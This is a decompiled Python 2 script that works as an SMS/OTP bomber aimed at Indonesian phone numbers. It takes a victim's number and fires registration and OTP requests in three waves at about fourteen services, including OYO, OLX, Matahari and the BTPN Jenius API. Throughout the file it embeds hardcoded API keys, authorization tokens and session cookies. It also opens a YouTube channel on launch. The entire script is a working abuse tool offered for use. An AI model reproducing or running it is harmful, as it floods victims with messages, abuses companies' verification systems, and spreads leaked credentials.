# uncompyle6 by arya
# Python bytecode 2.7
# Decompiled from: Python 2.7.17 (default, Dec  5 2019, 10:47:43) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Embedded file name: <Zidanz>
import os, sys, time, requests, re, json, random
from random import randrange as rg
os.system('xdg-open https://m.youtube.com/channel/UCzWOSICWhsyn9rH3siTDtuQ')

def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.1 / 80)


logo = '\x1b[97m\n    \xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n    \xe2\x95\x91    \x1b[91m\xe2\x95\x94\xe2\x95\x97 \x1b[97m\xe2\x94\xac\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac \xe2\x94\xac\xe2\x94\x8c\xe2\x94\xac\xe2\x94\x90\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac   \x1b[91m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\xa6 \xe2\x95\xa6    \x1b[97m\xe2\x95\x91\n    \xe2\x95\x91    \x1b[91m\xe2\x95\xa0\xe2\x95\xa9\xe2\x95\x97\x1b[97m\xe2\x94\x9c\xe2\x94\xac\xe2\x94\x98\xe2\x94\x82 \xe2\x94\x82 \xe2\x94\x82 \xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4\xe2\x94\x82\x1b[93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\x1b[91m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91  \xe2\x95\x91\xe2\x95\x91\xe2\x95\x91    \x1b[97m\xe2\x95\x91\n  \xe2\x95\x94\xe2\x95\x90\xe2\x95\x9d    \x1b[91m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\x1b[97m\xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\x94\xe2\x94\x80\xe2\x94\x98 \xe2\x94\xb4 \xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\xb4\xe2\x94\x80\xe2\x94\x98 \x1b[91m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\xa9\xe2\x95\x9d   \x1b[97m \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x97\n  \xe2\x95\x91\x1b[93m Work Only For Indonesian Phone Numbers \x1b[97m\xe2\x95\x91\n  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n     \x1b[91m\xe2\x97\x8f \x1b[97mAuthor     \x1b[93mMr.Gaming\n     \x1b[91m\xe2\x97\x8f \x1b[97mYou\x1b[91mTube\x1b[93m    CRAZY EAM\n'

def tanya():
    pil = raw_input('\n\x1b[31m[\033[00m?\033[31m] \033[37mUsing This Tools Again ? (\033[33my\033[00m/\033[31mn\033[00m) > ')
    if pil in ('y', ) or pil in ('Y', ):
        os.system('python2 brutal.py')
    else:
        print '\n Bye Bye Bitch \x1b[93m^_^\n'
        print '\n Jangan Lupa Subcribe Boys ^_^\n'
        time.sleep(0.5)
        exit()


def jenius():
    ua = {'accept': '*/*', 
       'btpn-apikey': 'f73eb34d-5bf3-42c5-b76e-271448c2e87d', 
       'version': '2.36.1-7565', 
       'accept-language': 'id', 
       'x-request-id': 'd7ba0ec4-ebad-4afd-ab12-62ce331379be', 
       'Content-Type': 'application/json', 
       'Host': 'api.btpn.com', 
       'Connection': 'Keep-Alive', 
       'Accept-Encoding': 'gzip', 
       'Cookie': 'c6bc80518877dd97cd71fa6f90ea6a0a=24058b87eb5dac1ac1744de9babd1607', 
       'User-Agent': 'okhttp/3.12.1'}
    dat = json.dumps({'query': 'mutation registerPhone($phone: String!, $language: Language!) {\n  registerPhone(input: {phone: $phone, language: $language}) {\n    authId\n    tokenId\n    __typename\n  }\n}\n', 'variables': {'phone': w, 'language': 'id'}, 'operationName': 'registerPhone'})
    r = requests.post('https://api.btpn.com/jenius', data=dat, headers=ua).text


def rupa():
    ua = {'Host': 'wapi.ruparupa.com', 
       'Connection': 'keep-alive', 
       'Authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiOGZlY2VjZmYtZTQ1Zi00MTVmLWI2M2UtMmJiMzUyZmQ2NzhkIiwiaWF0IjoxNTkzMDIyNDkyLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.fETKXQ0KyZdksWWsjkRpjiKLrJtZWmtogKyePycoF0E', 
       'Accept': 'application/json', 
       'Content-Type': 'application/json', 
       'X-Company-Name': 'odi', 
       'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36', 
       'user-platform': 'mobile', 
       'X-Frontend-Type': 'mobile', 
       'Origin': 'https://m.ruparupa.com', 
       'Referer': 'https://m.ruparupa.com/verification?page=otp-choices', 
       'Accept-Encoding': 'gzip, deflate, br', 
       'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    dat = json.dumps({'phone': no, 'action': 'register', 'channel': 'chat', 'email': '', 'customer_id': '0', 'is_resend': 0})
    r = requests.post('https://wapi.ruparupa.com/auth/generate-otp', data=dat, headers=ua).text


def mapclub():
    ua = {'Host': 'cmsapi.mapclub.com', 
       'Connection': 'keep-alive', 
       'Accept': 'application/json, text/plain, */*', 
       'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36', 
       'content-type': 'application/json', 
       'Origin': 'https://www.mapclub.com', 
       'Referer': 'https://www.mapclub.com/en/user/signup', 
       'Accept-Encoding': 'gzip, deflate, br', 
       'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    dat = json.dumps({'phone': no})
    r = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua).text


def oyo():
    ua = {'Host': 'identity-gateway.oyorooms.com', 
       'consumer_host': 'https://www.oyorooms.com', 
       'accept-language': 'id', 
       'access_token': 'SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=', 
       'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 
       'Content-Type': 'application/json', 
       'accept': '*/*', 
       'origin': 'https://www.oyorooms.com', 
       'referer': 'https://www.oyorooms.com/login', 
       'Accept-Encoding': 'gzip, deflate, br'}
    dat = json.dumps({'phone': c, 'country_code': '+62', 'country_iso_code': 'ID', 'nod': '4', 'send_otp': 'true', 'devise_role': 'Consumer_Guest'})
    r = requests.post('https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id', data=dat, headers=ua).text


def depop():
    ua = {'Host': 'webapi.depop.com', 
       'accept': 'application/json, text/plain, */*', 
       'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36', 
       'Content-Type': 'application/json', 
       'Accept-Encoding': 'gzip, deflate, br', 
       'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    dat = json.dumps({'phone_number': no, 'country_code': 'ID'})
    r = requests.put('https://webapi.depop.com/api/auth/v1/verify/phone', data=dat, headers=ua)


def soplai():
    ua = {'Host': 'api.sooplai.com', 
       'accept': 'application/json, text/plain, */*', 
       'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 
       'Content-Type': 'application/json', 
       'origin': 'https://www.sooplai.com', 
       'referer': 'https://www.sooplai.com/register', 
       'Accept-Encoding': 'gzip, deflate, br', 
       'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    dat = json.dumps({'phone': no})
    r = requests.post('https://api.sooplai.com/customer/register/otp/request', data=dat, headers=ua)


def call():
    head = {'X-Requested-With': 'XMLHttpRequest', 
       'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36', 
       'Content-Type': ' application/x-www-form-urlencoded; charset=UTF-8', 
       'Content-Type': 'application/json', 
       'Origin': 'https://id.jagreward.com', 
       'Referer': 'https://id.jagreward.com/member/register/', 
       'Accept-Encoding': 'gzip, deflate, br', 
       'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
       '__cfduid': 'd4de1e7ea2ced09ecde54a568af1ac50b1584709816', 
       '_ga': 'GA1.2.2037151396.1584709855', 
       'PHPSESSID': 'n88pmtvvsdpf25898a9jeqbggc', 
       'DAPROPS': 'sjs.webGlRenderer:PowerVR Rogue GE8320|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdevicePixelRatio:1.75|idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:1|bjs.deviceMotion:1|bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs.sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:1|bjs.webGl:1|bjs.webSockets:1|bjs.webSqlDatabase:1|bjs.webWorkers:1|bjs.xhr:1|iorientation:0|buserMedia:1|bjs.battery:0'}
    r = requests.get('https://id.jagreward.com/member/verify-mobile/' + c + '/', headers=head)


def call2():
    ua = {'Content-Type': 'application/json', 
       'Host': 'srv3.sampingan.co.id', 
       'Connection': 'Keep-Alive', 
       'Accept-Encoding': 'gzip', 
       'User-Agent': 'okhttp/4.4.0'}
    dat = json.dumps({'countryCode': '+62', 'phoneNumber': c})
    r = requests.post('https://srv3.sampingan.co.id/auth/generate-otp', data=dat, headers=ua)


def alodoc():
    req = requests.post('https://nuubi.herokuapp.com/api/spam/alodok', data={'number': no}).text


def olx():
    req = requests.post('https://www.olx.co.id/api/auth/authenticate', json={'grantType': 'phone', 'phone': w, 'language': 'id'}).json()


def matahari():
    heder = {'Host': 'thor.matahari.com', 'content-length': '230', 
       'modulecode': 'MR', 
       'origin': 'https://www.matahari.com', 
       'authorization': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJtb2R1bGVDb2RlIjoiTVIiLCJ1c2VyVHlwZSI6IjEiLCJleHAiOjE1NDM2NjA5MDYsInVzZXJOYW1lIjoiS0Zpb2ViMWhveU9FRDBERWQiLCJ1c2VySWQiOiJwcm9kdWN0aW9uNDYxOTAyNjQ0NSIsImp0aSI6IjFmMjI3NzE5LTY4OTMtNDhjYy1iNmQzLWY2OTkzMWMzMDIwYSIsImlhdCI6MTU0MzY1NzMwNn0.6XdrUX9QzD0Ld2eOJep7QnSwVjfFyjq-v7P4w0lGG9M', 
       'content-type': 'application/json', 
       'accept': 'application/json, text/plain, */*', 
       'clientid': 'mds_mweb', 
       'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 
       'sessionid': '1595084426451', 
       'save-data': 'on', 
       'referer': 'https://www.matahari.com/register', 
       'accept-encoding': 'gzip, deflate, br', 
       'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ms;q=0.6'}
    data = {'emailAddress': 'noobie@mail.com', 'firstName': 'Noobie', 
       'lastName': 'Gans', 
       'mobileNumber': no, 
       'mccCardNumber': '', 
       'password': 'asecc123', 
       'referralCode': '', 
       'dateOfBirth': '09-05-1993', 
       'gender': 'Male', 
       'registrationType': 'N'}
    sec = requests.post('https://thor.matahari.com/MatahariMobileAPI/register', headers=heder, json=data)


def klik():
    dat = {'number': no}
    r = requests.post('https://nuubi.herokuapp.com/api/spam/klikdok', data=dat)


def indo():
    ua = {'Host': 'account-api-v1.klikindomaret.com', 
       'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 
       'content-type': 'application/json', 
       'accept': '*/*', 
       'origin': 'https://account.klikindomaret.com', 
       'referer': 'https://account.klikindomaret.com/SMSVerification?nohp=' + no + '&type=register', 
       'accept-encoding': 'gzip, deflate, br', 
       'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.get('https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP=' + no, headers=ua).text


def wa2():
    name = 'Danz' + str(random.randrange(11, 99999))
    pas = 'termux' + str(random.randrange(111, 999))
    ua = {'Host': 'qtva.id', 
       'Connection': 'keep-alive', 
       'Accept': 'text/html, */*; q=0.01', 
       'X-Requested-With': 'XMLHttpRequest', 
       'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 
       'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 
       'Origin': 'https://qtva.id', 
       'Referer': 'https://qtva.id/page/register/siswa', 
       'Accept-Encoding': 'gzip, deflate, br', 
       'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
       'Cookie': 'PHPSESSID=7pf5ve6qvjlaeq8lv6ce91mbr4; AWSELB=6FCBA14B143B763E16068AD74D58AA579D9D142E7151220D3054E791C33C7FBA3884A9AF7839AD1DD49FFC6622C3A0FA538D30CDE7A17FB6AE724592130CC6587B0B6D0372; AWSELBCORS=6FCBA14B143B763E16068AD74D58AA579D9D142E7151220D3054E791C33C7FBA3884A9AF7839AD1DD49FFC6622C3A0FA538D30CDE7A17FB6AE724592130CC6587B0B6D0372; _ga=GA1.2.232839318.1597753085; _gid=GA1.2.158794496.1597753085; _gat=1'}
    dat = {'namaDepan': name, 
       'emailNope': no, 
       'password': pas, 
       'konfirmasiPass': pas}
    r = requests.post('https://qtva.id/page/frames.php?f=eVBDUVU0NE1DTStQTmgvallDaTA0QT09&p=RUtYZFBydUdXTmVWMUtnc3M1ZmtnVFpMSXRxTWlvQUduaTR6VFZzRk00UT0=&hc=bmFSencyM2FmUWxmckV4Y0pXdEVOQ1pYZW5pY0pXSlBENHZSaCtJNmtTSnR0SHJWeEJaOUhWZHVSUHpRcXhWTg==', data=dat, headers=ua).text


if __name__ == '__main__':
    try:
        time.sleep(1)
        os.system('clear')
        slowprint(logo)
        print '\x1b[90m  Example : (08786xxxxxxx)'
        no = raw_input('\x1b[91m  \xe2\x97\x8f \x1b[97mInput >\x1b[93m ')
        hh = '+62'
        c = no[1:12]
        w = hh + c
        time.sleep(1)
        matahari()
        oyo()
        indo()
        call()
        time.sleep(0.5)
        print '\n\n\x1b[92m  \xe2\x97\x8f \x1b[97mFirst Wave Spam Has Been \x1b[92mSuccessfully Sent'
        time.sleep(2.5)
        rupa()
        depop()
        jenius()
        mapclub()
        call2()
        time.sleep(0.5)
        print '\n\x1b[92m  \xe2\x97\x8f \x1b[97mSecond Wave Spam Has Been \x1b[92mSuccessfully Sent'
        time.sleep(3)
        alodoc()
        olx()
        klik()
        soplai()
        wa2()
        time.sleep(3.5)
        print '\n\x1b[92m  \xe2\x97\x8f \x1b[97mLast Wave Spam Has Been \x1b[92mSuccessfully Sent\n'
        time.sleep(3.5)
        tanya()
    except KeyError:
        exit()
    except KeyboardInterrupt:
        exit()
    except requests.exceptions.ConnectionError:
        print '\n\x1b[97m  Connection Failed \x1b[91m!'
        time.sleep(0.5)
        tanya()
    except TypeError:
        tanya()
    except ValueError:
        tanya()